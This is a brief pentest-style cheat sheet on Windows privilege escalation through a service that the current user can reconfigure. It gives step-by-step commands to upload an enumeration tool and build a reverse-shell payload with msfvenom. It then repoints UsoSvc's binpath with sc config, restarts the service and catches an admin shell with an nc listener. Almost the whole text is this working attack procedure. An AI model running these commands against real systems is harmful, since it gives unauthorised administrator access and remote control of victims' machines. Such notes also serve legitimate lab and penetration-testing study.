          PRIVILEGE ESCALATION USING VULNERABLE SERVICE CONFIG ACCESS

1.Upload winEnum.exe and run it,If it shows any service which can be configured by the current user
2.Then we can exploit it and gain Admin by setting binpath to the service
3.Create a reverse_shell exe file using msfvenom and Upload it to the victim machine
4. Use the path of the rev_shell exe and exploit the service
5.For example the service is UsoSvc & and the reverse_shell payload is in C:\tmp\payload.exe:
	i) sc config UsoSvc binpath="C:\tmp\payload.exe"    --> execute this command in cmd
	ii) sc stop UsoSvc  --> execute this command in cmd
	iii) start a listener in attacker machine    "nc -klp 4444"
	iV) sc start UsoSvc  --> execute this command in cmd
	v) you will get an admin shell in the listener
